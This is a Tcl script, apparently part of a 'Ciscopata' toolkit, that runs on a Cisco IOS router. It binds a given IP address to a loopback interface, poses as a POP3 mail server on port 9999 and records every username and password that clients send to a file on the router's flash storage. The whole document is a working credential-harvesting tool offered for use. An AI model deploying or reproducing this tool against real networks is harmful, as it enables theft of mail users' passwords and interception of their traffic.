#!/usr/bin/tclsh
proc mputs {data} {
 global mangao
 puts $mangao $data
}

proc bakea {sock} {
 set l [gets $sock]
 if {[eof $sock]} {
  close $sock
  global events
  set events 1
 } else {
  if [regexp {UIDL|LIST} $l] {
   puts $sock "+OK 0 0"
   puts $sock "."
  } elseif [regexp {CAPA|AUTH} $l] {
   puts $sock "-ERR"
  } else {
   puts $sock "+OK"
   if [regexp {USER (.*)} $l ma user] { mputs "USER: $user" }
   if [regexp {PASS (.*)} $l ma pass] { mputs "PASS: $pass\n" }
   
   if [regexp {PASS (.*)} $l ma pass] {
    puts "PASS: $pass"
   }
  }
  flush $sock
 }
}

proc accept {sock addr port} {
 fileevent $sock readable [list bakea $sock]
 fconfigure $sock -buffering line -blocking 0
 puts $sock "+OK"
 flush $sock
}

set lport 9999
set ver "1.0"

puts "CisPOP $ver - by XenoMuta <xenomuta\[at\]gmail.com>\nPart of the Ciscopata toolkit - https://github.com/xenomuta/ciscopata\n"
if ![string length $argv] {
 puts "ERROR: IP address expected\n"
 exit
}
if [catch {set mangao [open "flash:/cispop.txt" a]}] {
 puts "ERROR: Can't write to flash:/cispop.txt"
 exit
}
mputs "CisPOP on $argv"
catch {ios_config "interface lo 100" "ip address $argv 255.255.255.255" }
socket -server accept $lport
vwait events
catch {ios_config "interface lo 100" "no ip address $argv 255.255.255.255" }

